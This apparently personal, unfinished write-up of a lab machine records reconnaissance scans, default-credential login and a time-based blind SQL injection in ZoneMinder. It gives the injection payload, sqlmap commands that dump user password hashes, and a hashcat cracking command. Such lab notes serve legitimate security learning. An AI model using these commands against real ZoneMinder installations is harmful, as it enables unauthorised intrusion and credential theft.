---
tags:
banner:
publish: false
---
TCP scan
```bash
nmap -p- -sV -sC
```

# Box info
Ports:
- 22/tcp: ssh - OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
- 80/tcp http - Apache httpd 2.4.58

# Port 80 - http
Http fuzzing
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://cctv.htb/FUZZ
```

The results only really give the `index.html`.

the index only has a login button that leads to a [zoneminder](https://zoneminder.com/) page.

Zomeminder is a security camera website thingie.

## Checking cves
**Apache vulnerabilities** (v2.4.58):
[cve-2024-38476](https://www.cvedetails.com/cve/CVE-2024-38476/) doesnt work, as tested by [this](https://github.com/mrmtwoj/apache-vulnerability-testing) tool.

It’s probably not apache, since…why would you want to make a cool box have such a lame exploit.


**Zoneminder vulnerabilities**:
Found [this](https://www.cvedetails.com/vendor/8048/Zoneminder.html) list that lists all cves

[CVE-2024-43360](https://nvd.nist.gov/vuln/detail/CVE-2024-43360) (v 1.36.34, 1.37.61 / V1.36.33, V1.37.33) tried [this](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-9cmr-7437-v9fj) poc of a vulnerability, but it did not seem to work inside burp.

v1.37.33 [this](https://www.exploit-db.com/exploits/51902) poc also didnt work

[CVE-2023-41884](https://nvd.nist.gov/vuln/detail/CVE-2023-41884) (1.36.34) [this](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-2qp3-fwpv-mc96) seemed to just time out poc also didnt work

![[Vault-data/Attachments/10 CCTV - Easy box.png]]

[CVE-2025-65791](https://nvd.nist.gov/vuln/detail/CVE-2025-65791) seems to all refer to a single github POC that provides 0 context to how its used and is even being discredited in the issues tab.

Looking trough all cves might not be the correct route

## checking login request
the login token is sent with a `csrf_magic` token, so im guessing that csrf is out of the picture, as that is a coutner measure for it.

Not really knowing what im doing, and i dont see anything interesting other than to maybe sql inject.

[cve-2026-27470](https://nvd.nist.gov/vuln/detail/CVE-2026-27470) seems to be interesting.

Doesnt work as it needs auth. but it did lead me to discover [`sqlmap`](https://www.kali.org/tools/sqlmap/).

dude,
default credentials. admin admin.

fucking hell

# Zoneminder web page
- Version: V1.37.63

Seems tobe a site that shows closed circuit cameras.

There’s a lot of buttons to go trough.

The landing page shows no cameras
Scanning for cameras.

## Options page
- Display, noting interesting
- System, everything greyed out
	- CAN disable csrf magic
	- Auth hash secret: `...Change me to something unique...`
	- ZoneMinder API is enabled
	- Port 15002 is specified for receiving alarms from the alarm server
- Config, camera config stuff, noting interesting
- API, shows who has access
	- Users:
		- admin
		- mark
		- superadmin
	- All users have API enabled
- Servers, noting interesting
- Storage
	- Default path: `/var/cache/zoneminder/events`
- web, nothing interesting
- images, nothing interesting
- logging, nothing interesting
- Network
	- HTTP version 1.0 instead of 1.1
	- RTP ports: 40200 - 40499
		- Seems to be ports for camera video streams
- Email, nothing interesting
- Upload, nothing interesting
	- Although it does have ftp capabilities it seems
- x10, nothing interesting
- HIGH, Medm Low, Bandwidth, nothing interesting
- **Users**
	- Users:
		- admin
		- mark
		- superadmin
	- All users have the same rights, except for superadmin being able to:
		- Read/write snapshots (others cannot read/write)
		- Edit system (others can only view)
- Groups, nothing
- control
	- Seems to show all possible cameras and their properties
- privacy, **no permission**
- **mqtt**
	- port 1883
	- `mqtt.zoneminder.com`
	- no login credentials
	- topic prefix: `ZoneMinder`
- Telemetry, nothing interesting
- Version, version info but nothing interesting

## Exploits tried
1.37.63 seems to be vulnerable to [CVE-2024-51482](https://nvd.nist.gov/vuln/detail/CVE-2024-51482).

Trying [this poc](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3).

```bash
sqlman -u 'http://zm/index.phpview=request&request=event&action=removetag&tid=1' --cookie ZMSESSID=sessionid
```

Found vulnerability:
```
parameter tid (GET)
	Type: time-based blind
	Title: MQSQ: >= 5.0.12 AND time-based blind (query SLEEP)
	Payload: view=request&request=event&action=removettag&tid=1 AND (SELECT 6059 FROM (SELECT(SLEEP(5)))z0xs)
```

```bash
sqlmap -u 'http://zm/index.phpview=request&request=event&action=removetag&tid=1' --dbms=MySQL --dbs --cookie ZMSESSID=sessionid
```

Retrieved 3 databasse:
- informatinon_schema
- performance_scema
- zm

reading the zoneminder (zm) table

```bash
sqlmap -u 'http://zm/index.phpview=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm --tables --cookie ZMSESSID=sessionid
```

…I have found out why first blood took 25 minutes instead ofthe usual 3.

43 tables:
- Config
- ControlPresets
- Controls
- Deavices
- Event_Data
- Event_Summaries
- Events
- Events_Archived
- Events_Day
- Events_Hour
- Events_Month
- Events_Tags
- Events_Week
- Filters
- Frames
- Groups
- Groups_monitors
- Groups_Permissions
- Logs
- Manufacturers
- Maps
- Models
- MonitorPresets
- Monitor_Status
- Monitors
- Monitors_Permissions
- MontageLayouts
- Object_Types
- Reports
- Server_Stats
- Servers
- Sessions
- Snapshots
- Snapshots_Events
- States
- Stats
- Storage
- Tags
- TRiggersX10
- User_Preferences
- **Users**
- ZonePresets
- Zones
- Events
- Groups
- Logs
- Storage

…geez.

```bash
sqlmap -u 'http://zm/index.phpview=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm -T Users --columns --cookie ZMSESSID=sessionid
```

Columns:
- Id - int unsigned
- **Username** - varchar(64)
- **Password** - varchar(64)
- Name - varchar(64)
- Email - varchar(64)
- Phone - varchar(64)
- Language - varchar(8)
- Enabled - tinyint unsigned
- Stream - enum(‘None’,‘View’)
- Events - enum(‘None’,‘View’,‘Edit’)
- Control - enum(‘None’,‘View’,‘Edit’)
- Monitor - enum(‘None’, ‘View’,‘Edit’)
i just stopped it because this takes fucking ages.

```bash
sqlmap -u 'http://zm/index.phpview=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm -T Users --passwords admin,mark,superadmin --cookie ZMSESSID=sessionid
```

retreived `zmuser@localhost`. but mostly just useless

```bash
sqlmap -u 'http://zm/index.phpview=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm -T Users -C Username,Password --dump --cookie ZMSESSID=sessionid
```

hash time.
Hashes:
- hash_1 - superadmin
- hash_2 - mark
- hash_3 - admin
![[Vault-data/Attachments/10 CCTV - Easy box-2.png]]
The hashes look simmilar to the bcrypt one in [this](https://hashcat.net/wiki/doku.php?id=example_hashes) list. 

`bcrypt(sha512($pass)) / bcryptsha512`. number 28400 for hashcat.

```
hashcat -m 28400 superadmin.txt /usr/share/wordlists/rockyou.txt
```

